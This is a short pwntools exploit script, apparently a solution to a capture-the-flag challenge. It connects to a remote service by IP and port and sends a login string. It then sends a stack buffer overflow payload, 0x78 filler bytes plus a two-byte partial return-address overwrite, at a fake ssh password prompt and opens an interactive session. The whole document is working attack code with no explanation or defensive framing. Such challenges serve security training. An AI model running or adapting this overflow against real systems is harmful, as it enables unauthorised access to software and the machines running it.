from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./ssh1')
else:
    io = remote('210.30.97.133',28084)

def p():
    gdb.attach(proc.pidof(io)[0])

io.sendline(b'Lo0ra1N')
io.sendlineafter(b"C:\\Users\\LooraiN>",b'ssh loora1n@192.168.1.233')
#payload = b'21038uaASKIDIOgidjf902183aiuASDFf'
payload = b'\x41'
payload = payload.ljust(0x78,b'\x41')
payload += b'\x46\x13'
#p()
io.sendlineafter(b"****@***.***.***.***'s password: ",payload)


io.interactive()

